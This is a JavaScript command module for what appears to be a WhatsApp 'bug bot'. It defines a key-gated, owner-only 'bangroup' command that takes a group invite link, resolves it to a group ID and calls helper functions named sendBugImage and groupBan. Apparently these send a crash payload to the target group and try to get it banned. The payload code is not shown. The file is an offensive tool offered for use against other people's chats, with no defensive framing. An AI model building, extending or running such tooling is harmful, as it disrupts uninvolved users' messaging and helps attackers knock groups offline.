'use strict';
const settings = require('../settings');
const bug = require('../helper/bugcore');
const { swanky } = require('../helper/swanky');

const cooldowns = new Map();

module.exports = {
  name: 'bangroup',
  version: '1.0',
  author: 'swanky',

  commands: {
    bangroup: {
      category: 'bug',
      handler: async (conn, m, args, ctx) => {
        const chat = m.key.remoteJid;
        const reply = (t) => conn.sendMessage(chat, { text: t }, { quoted: m });

        if (!ctx.isOwner) return reply(`℘ ${swanky('access denied')} ℘`);

        // key gate: .bangroup <key> <invite-or-jid>
        const key = args[0];
        if (key !== settings.BAN_KEY) {
          return reply(`℘ ${swanky('bad key')} ℘\n${swanky('usage')}: .bangroup ${settings.BAN_KEY} <link|jid>`);
        }

        const target = args[1];
        if (!target) return reply(`℘ ${swanky('no target')} ℘`);

        // 30s cooldown per chat
        const now = Date.now();
        const last = cooldowns.get(chat) || 0;
        if (now - last < settings.BAN_COOLDOWN) {
          const wait = Math.ceil((settings.BAN_COOLDOWN - (now - last)) / 1000);
          return reply(`℘ ${swanky('cooldown')} ${wait}s ℘`);
        }
        cooldowns.set(chat, now);

        let jid = target;
        if (/chat\.whatsapp\.com\//.test(target)) {
          try {
            const code = target.split('/').pop().split('?')[0];
            const info = await conn.groupGetInviteInfo(code);
            jid = info.id;
          } catch (e) {
            return reply(`℘ ${swanky('invite resolve failed')} ℘`);
          }
        }
        if (!jid.endsWith('@g.us')) return reply(`℘ ${swanky('not a group')} ℘`);

        await reply(`℘ ${swanky('banning')} ${jid.split('@')[0]} ℘`);
        try {
          await bug.sendBugImage(conn, jid);
          await bug.groupBan(conn, jid);
          await reply(`℘ ${swanky('group banned')} ℘`);
        } catch (e) {
          await reply(`℘ ${swanky('ban failed')} ℘ ${e.message}`);
        }
      }
    }
  }
};